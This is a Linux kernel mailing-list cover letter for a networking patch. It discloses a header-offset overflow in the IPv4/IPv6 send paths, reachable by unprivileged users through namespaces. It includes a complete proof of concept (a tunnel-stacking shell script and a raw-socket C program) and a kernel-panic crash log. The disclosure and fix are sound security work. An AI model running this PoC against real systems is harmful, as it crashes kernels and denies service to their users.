Received: from mail-pl1-f172.google.com (mail-pl1-f172.google.com [209.85.214.172])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7C4C53D76
	for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 18:03:14 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.172
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785175396; cv=none; b=q0QZ202TWqEEl764t0g2ddy4SR7hwhZgQT8NR7B88NZY6+KPGUGrLeSva4/sWyoxHsYzwuWfPUmAjTULfKxAsVQm0Cta+X92wdz41xnqBZy8X3pqV2TdRWoJjVYI1f99PI6iKRbkYZhld9WGoPlsqfZGuIoAqmxdG3jusZSmPj8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785175396; c=relaxed/simple;
	bh=X87k2vTVqgwne/RQyGwp8yC7ukZMs4d8cfrAKLbFFIg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=PrMu0OEOHUynWCOn6Ahg1uxukyEUxAkRjvv2vzfcpJzHXj3hcQkOanFGbPXFr4kLi3YwSqvkwNbDuHKO6eR8H84ty5BoHX59rZAOc+pPJXgIwNvTGFQOfA2fh6K84P0AxvSSphx02vozx+1BSIYNo8mqxcPFvmAm3962t7Oi+Fc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=gG342Zhz; arc=none smtp.client-ip=209.85.214.172
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="gG342Zhz"
Received: by mail-pl1-f172.google.com with SMTP id d9443c01a7336-2cfff5f88dbso11184725ad.3
        for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 11:03:14 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785175394; x=1785780194; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=lly/RCryi1oHKJz8rNMwNeEjmJs1civV/Pwm798LMDc=;
        b=gG342ZhzWc5C3GuwSK3H61nVmJkonSCE/EoKpZ4wo5Aj6fc1zLGAqmmRIN8M9JPQO/
         OgtfCWA6ZEwhYjMwSDE/IjvJe8qud2JN8+DuG6K5auEpvZyS3CuoAF7DvEooKz/+8KzE
         4GmnjdF6+iEqpfBOnPPjk4yTtz6qJjPCjFJ2Ep1EQGErsnZR9ATMnRE5h8vuEzUXJit0
         dMsv1dcGVjDFwKjXDhH/WWviB1iKVd38LlpGLU0O+33LWMn0J1+MXZwm/N9hTxtSlDD2
         erwzZqkuLRiNfKka2QfZnZtpSdJU393YJa+4x+8k0kfGJyWBXH9nxhL3AqAlbx6WovqB
         Opmw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785175394; x=1785780194;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=lly/RCryi1oHKJz8rNMwNeEjmJs1civV/Pwm798LMDc=;
        b=Kzrn5JDaETyN36NWWn0AZwlSUwmhi5TM8Tha3j3bfA0XFupAeBn2eUul+td0s/uCc3
         7WX7ZqNRSk21XtNTf9/SzlCgquM448HupzZujyfOVbhqx2noZ71l3C6x3Cft7eoP0KNj
         wtwQzNcRHtKnFRxS/EW6FTSsEldVEFRqb5T+7Yqs7RkOyAnkMWsG96/freujlk6LrekD
         4yXlayf0GG6Pnl1Hpzy4vnDyQl1rWJanAgPPpVyAR0YsIrNgOBlpHkxbDu+n6vfUjhb4
         gtIFlFWf5earIvKFxPdCNAKNuHaZX56B/hVndeP8GIJRHtU4z6XrWua3VI8+jv5ovwIJ
         MZVg==
X-Gm-Message-State: AOJu0YyLzSbbtWKGz8m6wPOLhzYzEHNKStvEy+UwuS8YX5R9Uktrx97D
	eCO7PxTb9CZCAVnXk9/k1SLgbMgNY7381z7LRnSJDZxgn23KkBPQ5IgJ7VTwoeFZU9W/ug==
X-Gm-Gg: AR+sD13UkqYAAPvPmhii2PRAMLNCNYWfEAqMDo8U3GCWl1qUCXasN9ijgkWqW3MCTfL
	L0OCTfmrH7jyz4ZxPOHuLQC7iDkBKoD3kqgbxC1hkLZ/sbbGjOD8LYrFFs9g9CKbXQzVEzoItl0
	dOs8IyBxYek94vcjPmSihSNJIxcJNm6+T8RnPhw8Vaqx1i6YWJPF4zLH5XkAH8eftzi6xYIa4wi
	3zwzmQmBODlVMVqpPNLrw4lrvPTcBc286g09+/PU6iqSYj8aRFjWXn4vuK6An7k1C6nE/w7bO8j
	1PJ3sztBqEqutaxh+Zzul7irYaUNq6c6YEnTPQAm4VjdiKqU2sx9lsel1XwRLpbaCRREWtunFdl
	jZ7THdSRZhYSg//8mu7lxxlcjps8Sq0e6M2D5z/awXi3mBB5slaK8urcdmJ0lE0eDGS+r5g6/xn
	DaDZQNT5+JJM3oHRPGwVvE
X-Received: by 2002:a17:903:2f0e:b0:2ca:ed41:d33d with SMTP id d9443c01a7336-2d00f44e0cfmr3183175ad.45.1785175393899;
        Mon, 27 Jul 2026 11:03:13 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2cfde7bc338sm39171155ad.43.2026.07.27.11.03.08
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 27 Jul 2026 11:03:13 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	kuniyu@google.com,
	jlayton@kernel.org,
	runyu.xiao@seu.edu.cn,
	kees@kernel.org,
	michael.bommarito@gmail.com,
	gustavoars@kernel.org,
	willemb@google.com,
	lirongqing@baidu.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] net: reject IP sends with excessive headroom
Date: Tue, 28 Jul 2026 02:03:05 +0800
Message-ID: <cover.1785054561.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv6/raw.c. The bug is reachable
by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

IPv4 and IPv6 output paths reserve LL_RESERVED_SPACE(dev) before recording skb
network and transport header offsets. Those offsets are stored in 16-bit skb
fields.

A namespace-local stack of tunnel devices can make hard_header_len plus
needed_headroom exceed the range of those fields. In rawv6_send_hdrinc(), the
wrapped skb->network_header makes ipv6_hdr(skb) point back into headroom
instead of the packet area just reserved by skb_put(). The user-supplied IPv6
packet is copied to that wrapped header pointer while the actual packet data
remains stale. Later IPv6 output and error handling can operate on invalid
headers and crash, as seen in __skb_flow_dissect().

The same root cause is present in the ordinary IPv4 and IPv6 append/cork
paths, which reserve device headroom and then store network_header plus
fragheaderlen in skb->transport_header. IPv4 raw HDRINCL also adds the
user-provided ihl to skb->transport_header after parsing the header.

The fix rejects IPv4 and IPv6 sends before the affected header offsets are
stored if the largest offset for that path cannot be encoded in the skb header
fields.

Reproducer:

    make
    unshare -Urn ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/bash
set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
	echo "run as root or inside 'unshare -Urn'" >&2
	exit 1
fi

DIR="$(cd "$(dirname "$0")" && pwd)"

sysctl -qw net.ipv6.conf.all.accept_dad=0
sysctl -qw net.ipv6.conf.default.accept_dad=0
sysctl -qw net.ipv6.conf.all.router_solicitations=0
sysctl -qw net.ipv6.conf.default.router_solicitations=0
sysctl -qw net.ipv6.conf.all.accept_ra=0
sysctl -qw net.ipv6.conf.default.accept_ra=0
sysctl -qw net.ipv6.conf.all.autoconf=0
sysctl -qw net.ipv6.conf.default.autoconf=0

ip link add x0 type veth peer name x1
ip link set x0 up
ip link set x1 up
ip -6 addr add fd40::1/64 dev x0 nodad
ip -6 addr add fd40::2/64 dev x1 nodad

prev=x0
for i in $(seq 0 1637); do
	name="w$i"
	subnet="$(printf '%x' "$i")"
	next="$(printf '%x' "$((i + 1))")"
	ip link add "$name" type ip6tnl mode ip6ip6 \
		local "fd40:${subnet}::1" remote "fd40:${subnet}::2" \
		dev "$prev" encaplimit none
	ip link set "$name" up
	ip -6 addr add "fd40:${next}::1/64" dev "$name" nodad
	prev="$name"
	if (( (i + 1) % 400 == 0 )); then
		echo "built $((i + 1)) / 1638 tunnels" >&2
	fi
done

exec "$DIR/poc" w1637 fd40:666::1 fd40:666::2 160

------END poc.sh--------

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <net/if.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

struct ipv6_hdr_raw {
	uint32_t vtc_flow;
	uint16_t payload_len;
	uint8_t nexthdr;
	uint8_t hop_limit;
	struct in6_addr saddr;
	struct in6_addr daddr;
} __attribute__((packed));

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

int main(int argc, char **argv)
{
	const char *ifname;
	const char *src_str;
	const char *dst_str;
	struct sockaddr_in6 dst = { 0 };
	struct ipv6_hdr_raw *hdr;
	unsigned char *packet;
	int sock;
	int hdrincl = 1;
	size_t payload_len = 160;
	size_t packet_len;
	ssize_t sent;

	if (argc < 4 || argc > 5) {
		fprintf(stderr, "usage: %s <ifname> <src> <dst> [payload_len]\n", argv[0]);
		return 1;
	}

	ifname = argv[1];
	src_str = argv[2];
	dst_str = argv[3];

	if (argc == 5) {
		char *end = NULL;
		unsigned long tmp = strtoul(argv[4], &end, 0);

		if (!end || *end != '\0' || tmp > 1200) {
			fprintf(stderr, "invalid payload_len: %s\n", argv[4]);
			return 1;
		}
		payload_len = tmp;
	}

	packet_len = sizeof(*hdr) + payload_len;
	packet = calloc(1, packet_len);
	if (!packet)
		die("calloc");

	hdr = (struct ipv6_hdr_raw *)packet;
	hdr->vtc_flow = htonl(6u << 28);
	hdr->payload_len = htons((uint16_t)payload_len);
	hdr->nexthdr = 59;
	hdr->hop_limit = 64;

	if (inet_pton(AF_INET6, src_str, &hdr->saddr) != 1) {
		fprintf(stderr, "invalid source IPv6 address: %s\n", src_str);
		return 1;
	}
	if (inet_pton(AF_INET6, dst_str, &hdr->daddr) != 1) {
		fprintf(stderr, "invalid destination IPv6 address: %s\n", dst_str);
		return 1;
	}

	for (size_t i = 0; i < payload_len; i++)
		packet[sizeof(*hdr) + i] = (unsigned char)i;

	sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0)
		die("socket(AF_INET6, SOCK_RAW, IPPROTO_RAW)");

	if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, ifname, strlen(ifname) + 1) < 0)
		die("setsockopt(SO_BINDTODEVICE)");

	if (setsockopt(sock, IPPROTO_IPV6, IPV6_HDRINCL, &hdrincl, sizeof(hdrincl)) < 0)
		die("setsockopt(IPV6_HDRINCL)");

	dst.sin6_family = AF_INET6;
	if (inet_pton(AF_INET6, dst_str, &dst.sin6_addr) != 1) {
		fprintf(stderr, "invalid destination IPv6 address: %s\n", dst_str);
		return 1;
	}

	sent = sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dst, sizeof(dst));
	if (sent < 0)
		die("sendto");

	printf("sent %zd bytes via %s\n", sent, ifname);
	close(sock);
	free(packet);
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  234.045915] BUG: unable to handle page fault for address: ffff88821e640006
[  234.047065] #PF: supervisor read access in kernel mode
[  234.047877] #PF: error_code(0x0000) - not-present page
[  234.048721] PGD 5a01067 P4D 5a01067 PUD 0
[  234.049389] Oops: Oops: 0000 [#1] SMP NOPTI
[  234.050125] CPU: 2 UID: 1028 PID: 9206 Comm: python3 Not tainted 6.12.95 #1
[  234.051234] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  234.053041] RIP: 0010:__skb_flow_dissect (/home/roxy/linux-block-patch/build/../include/linux/rcupdate.h:867 /home/roxy/linux-block-patch/build/../net/core/flow_dissector.c:1172)
[  234.053865] Code: 00 00 00 00 00 48 c7 84 24 a0 00 00 00 00 00 00 00 83 f8 27 0f 8e 9a 0a 00 00 49 63 c6 4c 01 c0 0f 84 7f 01 00 00 49 8b 14 24 <44> 0f b6 48 06 f6 c2 08 74 3c 41 0f b7 54 24 0e 48 8b 48 08 41 bd
All code
========
   0:	00 00                	add    %al,(%rax)
   2:	00 00                	add    %al,(%rax)
   4:	00 48 c7             	add    %cl,-0x39(%rax)
   7:	84 24 a0             	test   %ah,(%rax,%riz,4)
   a:	00 00                	add    %al,(%rax)
   c:	00 00                	add    %al,(%rax)
   e:	00 00                	add    %al,(%rax)
  10:	00 83 f8 27 0f 8e    	add    %al,-0x71f0d808(%rbx)
  16:	9a                   	(bad)
  17:	0a 00                	or     (%rax),%al
  19:	00 49 63             	add    %cl,0x63(%rcx)
  1c:	c6                   	(bad)
  1d:	4c 01 c0             	add    %r8,%rax
  20:	0f 84 7f 01 00 00    	je     0x1a5
  26:	49 8b 14 24          	mov    (%r12),%rdx
  2a:*	44 0f b6 48 06       	movzbl 0x6(%rax),%r9d		<-- trapping instruction
  2f:	f6 c2 08             	test   $0x8,%dl
  32:	74 3c                	je     0x70
  34:	41 0f b7 54 24 0e    	movzwl 0xe(%r12),%edx
  3a:	48 8b 48 08          	mov    0x8(%rax),%rcx
  3e:	41                   	rex.B
  3f:	bd                   	.byte 0xbd

Code starting with the faulting instruction
===========================================
   0:	44 0f b6 48 06       	movzbl 0x6(%rax),%r9d
   5:	f6 c2 08             	test   $0x8,%dl
   8:	74 3c                	je     0x46
   a:	41 0f b7 54 24 0e    	movzwl 0xe(%r12),%edx
  10:	48 8b 48 08          	mov    0x8(%rax),%rcx
  14:	41                   	rex.B
  15:	bd                   	.byte 0xbd
[  234.056808] RSP: 0018:ffffc9000aac75a0 EFLAGS: 00010286
[  234.057649] RAX: ffff88821e640000 RBX: ffff8881055201c0 RCX: ffffc9000aac76cc
[  234.058844] RDX: 000000000020105f RSI: 0000000000000000 RDI: 0000000000000000
[  234.059977] RBP: ffffc9000aac76a0 R08: ffff88821e640000 R09: 0000000000000000
[  234.061118] R10: 000000000000dd86 R11: ffffc9000aac76cc R12: ffffffff83966000
[  234.062255] R13: ffffc9000aac7620 R14: 0000000000000000 R15: 0000000000000000
[  234.063403] FS:  00007e28f9bbd780(0000) GS:ffff88813bd00000(0000) knlGS:0000000000000000
[  234.064686] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  234.065606] CR2: ffff88821e640006 CR3: 000000011e52a002 CR4: 0000000000770ef0
[  234.066745] PKRU: 55555554
[  234.067214] Call Trace:
[  234.067617]  <TASK>
[  234.070979]  __xfrm_decode_session (/home/roxy/linux-block-patch/build/../net/xfrm/xfrm_policy.c:3504)
[  234.071688]  icmpv6_route_lookup (/home/roxy/linux-block-patch/build/../include/net/ip6_route.h:285 /home/roxy/linux-block-patch/build/../net/ipv6/icmp.c:372)
[  234.072397]  icmp6_send (/home/roxy/linux-block-patch/build/../net/ipv6/icmp.c:686 (discriminator 1))
[  234.073647]  icmpv6_ndo_send (/home/roxy/linux-block-patch/build/../net/ipv6/ip6_icmp.c:16)
[  234.074296]  ip6_tnl_start_xmit (/home/roxy/linux-block-patch/build/../net/ipv6/ip6_tunnel.c:1440)
[  234.074981]  dev_hard_start_xmit (/home/roxy/linux-block-patch/build/../include/linux/netdevice.h:4835 /home/roxy/linux-block-patch/build/../include/linux/netdevice.h:5379 /home/roxy/linux-block-patch/build/../include/linux/netdevice.h:5371 /home/roxy/linux-block-patch/build/../net/core/dev.c:3888 /home/roxy/linux-block-patch/build/../net/core/dev.c:3904)
[  234.075660]  __dev_queue_xmit (/home/roxy/linux-block-patch/build/../include/linux/netfilter_netdev.h:137 /home/roxy/linux-block-patch/build/../net/core/dev.c:4806)
[  234.080901]  ip6_finish_output2 (/home/roxy/linux-block-patch/build/../include/net/ipv6.h:738 /home/roxy/linux-block-patch/build/../net/ipv6/ip6_output.c:83)
[  234.083021]  ip6_finish_output (/home/roxy/linux-block-patch/build/../include/net/dst.h:582 (discriminator 2) /home/roxy/linux-block-patch/build/../net/ipv6/ip6_output.c:235 (discriminator 2))
[  234.083699]  rawv6_sendmsg (/home/roxy/linux-block-patch/build/../net/ipv6/raw.c:908)
[  234.086335]  __sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:2258)
[  234.086841]  __x64_sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:2268)
[  234.087453]  do_syscall_64 (/home/roxy/linux-block-patch/build/../include/linux/sched/task_stack.h:23 /home/roxy/linux-block-patch/build/../arch/x86/include/asm/entry-common.h:43 /home/roxy/linux-block-patch/build/../include/linux/irq-entry-common.h:100 /home/roxy/linux-block-patch/build/../include/linux/entry-common.h:174 /home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:89)
[  234.088057]  entry_SYSCALL_64_after_hwframe (/home/roxy/linux-block-patch/build/../arch/x86/entry/entry_64.S:121)
[  234.088865] RIP: 0033:0x7e28f9c51687
[  234.092398] RSP: 002b:00007ffeda544450 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  234.093617] RAX: ffffffffffffffda RBX: 00007e28f9bbd780 RCX: 00007e28f9c51687
[  234.094763] RDX: 00000000000000c8 RSI: 00007e28f96489b0 RDI: 0000000000000003
[  234.096853] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
[  234.099484] CR2: ffff88821e640006
[  234.099936] ---[ end trace 0000000000000000 ]---
[  234.111918] Kernel panic - not syncing: Fatal exception in interrupt

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  net: reject IP sends with excessive headroom

 net/ipv4/ip_output.c  | 2 ++
 net/ipv4/raw.c        | 5 ++++-
 net/ipv6/ip6_output.c | 4 ++++
 net/ipv6/raw.c        | 2 ++
 4 files changed, 12 insertions(+), 1 deletion(-)

-- 
2.43.0

